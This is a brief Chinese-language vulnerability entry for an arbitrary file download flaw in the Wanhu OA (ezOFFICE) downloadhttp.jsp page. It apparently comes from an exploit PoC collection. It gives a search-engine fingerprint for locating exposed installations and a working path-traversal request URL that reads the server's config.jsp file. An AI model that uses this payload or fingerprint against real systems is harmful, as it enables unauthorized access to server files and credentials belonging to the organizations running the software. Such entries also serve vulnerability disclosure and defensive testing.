# 万户OA downloadhttp.jsp 任意文件下载漏洞

## 漏洞描述

万户OA downloadhttp.jsp文件存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件

## 漏洞影响

```
万户OA
```

## 网络测绘

```
app="万户网络-ezOFFICE"
```

## 漏洞复现

产品页面

![image-20220520132806210](images/202205201328307.png)

验证POC

```
/defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp
```

![image-20220520132818308](images/202205201328396.png)